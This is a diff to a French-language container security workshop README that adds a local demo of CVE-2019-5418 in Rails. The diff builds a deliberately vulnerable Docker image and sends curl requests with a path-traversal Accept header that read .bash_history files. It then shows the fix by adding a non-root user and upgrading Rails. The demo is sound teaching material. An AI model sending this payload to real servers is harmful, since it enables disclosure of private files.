@@ -7,6 +7,32 @@ Le workshop commencera d'abord par une présentation générale des différents 
 Pour pouvoir continuer à avancer même si une étape est problématique, nous vous fournissons les solutions de chacune des étapes.
 
 ### 01 : Construire des images de conteneurs en appliquant les bonnes pratiques de sécurité
+
+
+Demo of CVE-2019-5418 (https://github.com/mpgn/CVE-2019-5418)
+```
+docker image build -t rails-with-cve .
+docker container run -d --rm --name rails-with-cve -p 3000:3000 rails-with-cve
+curl localhost:3000/chybeta
+curl localhost:3000/chybeta -H "Accept: ../../../../../../../../../../root/.bash_history{{"
+docker container stop rails-with-cve
+```
+Step add USER
+```
+docker image build -t rails-with-user -f DockerfileWithUser .
+docker container run -d --rm --name rails-with-user -p 3000:3000 rails-with-user
+curl localhost:3000/chybeta
+curl localhost:3000/chybeta -H "Accept: ../../../../../../../../../../root/.bash_history{{"
+curl localhost:3000/chybeta -H "Accept: ../../../../../../../../../../rails/.bash_history{{"
+```
+Step update rails
+```
+docker image build -t rails-without-cve -f DockerfileWithoutCVE .
+docker container run -d --rm --name rails-without-cve -p 3000:3000 rails-without-cve
+curl localhost:3000/chybeta
+curl localhost:3000/chybeta -H "Accept: ../../../../../../../../../../rails/.bash_history{{"
+```
+
  - https://res.cloudinary.com/snyk/image/upload/v1551798390/Docker_Image_Security_Best_Practices_.pdf
  - USER
  - Upgrade packages ?
